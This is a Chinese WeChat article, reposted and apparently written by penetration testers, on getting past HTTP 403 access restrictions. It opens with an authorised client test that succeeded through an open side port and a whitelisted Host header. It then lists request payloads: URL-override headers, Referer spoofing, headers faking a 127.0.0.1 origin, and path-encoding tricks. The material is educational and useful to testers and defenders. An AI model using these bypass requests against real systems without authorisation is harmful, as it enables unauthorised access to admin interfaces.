---
title: 记一次403绕过技巧
url: https://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496702&idx=1&sn=ccb6ca82a7619221cba900ace2697593&chksm=e8a5f99ddfd2708b2ee5473ca32edfca0c08662b0a9a537ed7755fe283d5176a2b86eaec8cdd&scene=58&subscene=0#rd
source: 迪哥讲事
date: 2024-12-30
fetch_date: 2025-10-06T19:36:45.170796
---

# 记一次403绕过技巧

![cover_image](https://mmbiz.qpic.cn/mmbiz_jpg/YmmVSe19Qj75XpW3VeI6PbDCDNBXrGeBicWC4BHAosIkYhicopfd4QzpB5Y5As2sQPp5QzeqMBbpBkDQEBAtDlZQ/0?wx_fmt=jpeg)

# 记一次403绕过技巧

迪哥讲事

以下文章来源于酒仙桥六号部队
，作者六号刃部

![](http://wx.qlogo.cn/mmhead/Q3auHgzwzM6h5jOvetH9FCV9SZjkg2PBbViaA8jlNfDJtZqedia3h3UQ/0)

**酒仙桥六号部队**
.

知其黑，守其白。 分享知识盛宴，闲聊大院趣事，备好酒肉等你！

这是 **酒仙桥六号部队**的第 **137**篇文章。

全文共计3085个字，预计阅读时长9分钟。

#

**背景**

记一次接到客户的一个需求，后台管理地址（https://xxx.xxxx.com）仅允许工作区公网出口访问，对于IP的访问限制是否存在缺陷可以绕过，外网进行访问返回403状态码。

**实战**

### 姿势一: 端口利用

拿到客户给的地址后，首先进行信息收集。端口信息收集，利用nmap进行全端口探测，发现除了80端口之外，还开放了一个web服务的8001端口，我们尝试使用8001端口访问(https://xxx.xxxx.com:8001)，总是充满惊喜。可直接绕过IP限制进行访问。怕是这个运维要挨锤了，立马把这个问题，反馈给客户。

https://iamadmixxx.xxx.xxx:8001/auth/login

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55WNeR8CJTTKSiaX3vVl0QqjXic9zib53MiafA6j97LXyAficWLKQKRcLIMQWqDw9LC4IRqcmYGlWZxBhw/640?wx_fmt=jpeg)

通过沟通，由于疏忽未下线8001端口，客户貌似认为这个很简单，关闭8001端口，下线业务后，让我们继续尝试后台能否绕过。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55WNeR8CJTTKSiaX3vVl0QqjDe2b3FSibSqjyf2JlOUpCQfwrZg35Yu6Qojfm4MDk9f7XBKlrtPhuSg/640?wx_fmt=jpeg)

### 姿势二：修改HOST

我们先说下Host在请求头中的作用，在一般情况下，几个网站可能会部署在同一个服务器上，或者几个 web 系统共享一个服务器，通过host头来指定应该由哪个网站或者web系统来处理用户的请求。

而很多WEB应用通过获取HTTP HOST头来获得当前请求访问的位置，但是很多开发人员并未意识到HTTP HOST头由用户控制，从安全角度来讲，任何用户输入都是认为不安全的。

当服务器获取HOST的方式不当时，我们可以通过修改Host值来进行绕过。首先对该目标域名进行子域名收集，整理好子域名资产（host字段同样支持IP地址）。先Fuzz测试跑一遍收集到的子域名，这里使用的是Burp的Intruder功能。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55WNeR8CJTTKSiaX3vVl0Qqj4Gg0zEkmxZsCj5adiaW19vd0fhsl9GiczayHf8RHXpmYVpf85OpDjwfg/640?wx_fmt=jpeg)

往往成功也离不开运气，看到一个服务端返回200的状态码。成功找到一个在HOST白名单中的子域名。我们利用firefox插件来修改HOST值，成功绕过访问限制。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55WNeR8CJTTKSiaX3vVl0QqjsrEVMbN1h17EGnSImNUEX0TD4u48TdHvVVQKwP4aFUicUiaMyqnMZScQ/640?wx_fmt=jpeg)

另辟蹊径，效果越出彩，而且技巧也远远不止上面提到的一小部分。

在这里我们总结一下403绕过技巧

### 姿势三：覆盖请求URL

尝试使用X-Original-URL和X-Rewrite-URL标头绕过Web服务器的限制。

介绍：通过支持X-Original-URL和X-Rewrite-URL标头，用户可以使用X-Original-URL或X-Rewrite-URL HTTP请求标头覆盖请求URL中的路径，尝试绕过对更高级别的缓存和Web服务器的限制。

示例：

```
Request  GET /auth/login HTTP/1.1  Response  HTTP/1.1 403 Forbidden    Reqeust  GET / HTTP/1.1  X-Original-URL: /auth/login  Response  HTTP/1.1 200 OK   or    Reqeust  GET / HTTP/1.1  X-Rewrite-URL: /auth/login  Response  HTTP/1.1 200 OK
```

Burp学院实验室进行演示，首先普通用户访问admin页面会被限制,要使用admin用户登录才行。点击 管理面板（Admin panel）burp抓包查看，服务端返回403，"Access denied"禁止访问。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55WNeR8CJTTKSiaX3vVl0QqjyOe8xVJ1ptEH1fXMu76ich4sx9CPWbicMibeKvQNSuxus1DULWt4dqJ0w/640?wx_fmt=jpeg)

在Header头中添加X-Original-URL标头，发现已经有权限可以删除Administrator、carlos、wiener 帐号的管理员权限。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55WNeR8CJTTKSiaX3vVl0Qqj4ibSEbNYoWOc3G9q2LyrjiciauL16YHlaDdzzkpD7e3e3xtoeke6vAyyA/640?wx_fmt=jpeg)

### 姿势四：Referer标头绕过

尝试使用Referer标头绕过Web服务器的限制。

介绍：Referer 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 Referer 请求头识别访问来源。

示例：

```
RequestGET /auth/login HTTP/1.1Host: xxxResponseHTTP/1.1 403 Forbidden
ReqeustGET / HTTP/1.1Host: xxxReFerer:https://xxx/auth/loginResponseHTTP/1.1 200 OK
or
ReqeustGET /auth/login HTTP/1.1Host: xxxReFerer:https://xxx/auth/loginResponseHTTP/1.1 200 OK
```

Burp学院实验室进行演示，使用非管理员凭据登录后,浏览/admin-roles?username=carlos&action=upgrade 服务端返回401未进行认证，无权限访问。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55WNeR8CJTTKSiaX3vVl0QqjOPiaCcvsPXRkTtroPOU6IMVTBJEaicuwLGwm9S0jC416rw3GL4RQHSPg/640?wx_fmt=jpeg)

在Header头中添加Referer标头，服务端提示302表示请求成功，使用Referer标头绕过Web服务器的限制。

![](https://mmbiz.qpic.cn/mmbiz_jpg/WTOrX1w0s55WNeR8CJTTKSiaX3vVl0QqjXWWGWAyV3Mo7623jOPAicTbJEwZdNm8FInV3ibxsbHDwS1NUGwoAHFFg/640?wx_fmt=jpeg)

### 姿势五：代理IP

一般开发者会通过Nginx代理识别访问端IP限制对接口的访问，尝试使用 X-Forwarded-For、X-Forwared-Host等标头绕过Web服务器的限制。

```
- X-Originating-IP: 127.0.0.1- X-Remote-IP: 127.0.0.1- X-Client-IP: 127.0.0.1- X-Forwarded-For: 127.0.0.1- X-Forwared-Host: 127.0.0.1- X-Host: 127.0.0.1- X-Custom-IP-Authorization: 127.0.0.1
```

示例

```
RequestGET /auth/login HTTP/1.1ResponseHTTP/1.1 401 Unauthorized
ReqeustGET /auth/login HTTP/1.1X-Custom-IP-Authorization: 127.0.0.1ResponseHTTP/1.1 200 OK
```

### 姿势六：扩展名绕过

基于扩展名，用于绕过403受限制的目录。

```
site.com/admin => 403site.com/admin/ => 200site.com/admin// => 200site.com//admin// => 200site.com/admin/* => 200site.com/admin/*/ => 200site.com/admin/. => 200site.com/admin/./ => 200site.com/./admin/./ => 200site.com/admin/./. => 200site.com/admin/./. => 200site.com/admin? => 200site.com/admin?? => 200site.com/admin??? => 200site.com/admin..;/ => 200site.com/admin/..;/ => 200site.com/%2f/admin => 200site.com/%2e/admin => 200site.com/admin%20/ => 200site.com/admin%09/ => 200site.com/%20admin%20/ => 200
```

如果你是一个长期主义者，欢迎加入我的知识星球，我们一起往前走，每日都会更新，精细化运营，微信识别二维码付费即可加入，如不满意，72 小时内可在 App 内无条件自助退款

![](https://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj5EMr3X76qdKBrhIIkBlVVyuiaiasseFZ9LqtibyKFk7gXvgTU2C2yEwKLaaqfX0DL3eoH6gTcNLJvDQ/640?wx_fmt=png&from=appmsg)

## 往期回顾

[一款bp神器](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495880&idx=1&sn=65d42fbff5e198509e55072674ac5283&chksm=e8a5faabdfd273bd55df8f7db3d644d3102d7382020234741e37ca29e963eace13dd17fcabdd&scene=21#wechat_redirect)

[ssrf绕过新思路](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247495841&idx=1&sn=bbf477afa30391b8072d23469645d026&chksm=e8a5fac2dfd273d42344f18c7c6f0f7a158cca94041c4c4db330c3adf2d1f77f062dcaf6c5e0&scene=21#wechat_redirect)

[一个辅助测试ssrf的工具](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247496380&idx=1&sn=78c0c4c67821f5ecbe4f3947b567eeec&chksm=e8a5f8dfdfd271c935aeb4444ea7e928c55cb4c823c51f1067f267699d71a1aad086cf203b99&scene=21#wechat_redirect)

[dom-xss精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247488819&idx=1&sn=5141f88f3e70b9c97e63a4b68689bf6e&chksm=e8a61f50dfd1964692f93412f122087ac160b743b4532ee0c1e42a83039de62825ebbd066a1e&scene=21#wechat_redirect)

[年度精选文章](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487187&idx=1&sn=622438ee6492e4c639ebd8500384ab2f&chksm=e8a604b0dfd18da6c459b4705abd520cc2259a607dd9306915d845c1965224cc117207fc6236&scene=21#wechat_redirect)

[Nuclei权威指南-如何躺赚](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247487122&idx=1&sn=32459310408d126aa43240673b8b0846&chksm=e8a604f1dfd18de737769dd512ad4063a3da328117b8a98c4ca9bc5b48af4dcfa397c667f4e3&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试设置功能IV](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486973&idx=1&sn=6ec419db11ff93d30aa2fbc04d8dbab6&chksm=e8a6079edfd18e88f6236e237837ee0d1101489d52f2abb28532162e2937ec4612f1be52a88f&scene=21#wechat_redirect)

[漏洞赏金猎人系列-如何测试注册功能以及相关Tips](http://mp.weixin.qq.com/s?__biz=MzIzMTIzNTM0MA==&mid=2247486764&idx=1&sn=9f78d4c937675d76fb94de20effdeb78&chksm=e8a6074fdfd18e59126990bc3fcae300cdac492b374ad3962926092aa0074c3ee0945a31aa8a&scene=21#wechat_redirect)

**总结**

出于某些原因，限制我们访问某页面或资源，我们可以使用如上方法进行绕过。已经有人写好(burp插件)[https://github.com/sting8k/BurpSuite\_403Bypasser]，自动扫描每个403请求，有更多的方法和技巧欢迎交流学习。

## 参考

https://twitter.com/jae\_hak99/status/1292043668375744514 https://twitter.com/lobuhisec/status/1329705441883017218 https://twitter.com/iam\_j0ker/status/1303658167205728256

预览时标签不可点

![]()

微信扫一扫
关注该公众号

继续滑动看下一个

轻触阅读原文

![](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

迪哥讲事

向上滑动看下一个

知道了

![]()
微信扫一扫
使用小程序

取消
允许

取消
允许

取消
允许

×
分析

![跳转二维码]()

![作者头像](http://mmbiz.qpic.cn/mmbiz_png/YmmVSe19Qj4k2mXPm8xlXujVgicTGvZbcictoGLuPERQn9lRPAKkKUB5ut9XMicric8PxLRmSOq0tT5LuGuD1WemBQ/0?wx_fmt=png)

微信扫一扫可打开此内容，
使用完整服务

：
，
，
，
，
，
，
，
，
，
，
，
，
。

视频
小程序
赞
，轻点两下取消赞
在看
，轻点两下取消在看
分享
留言
收藏
听过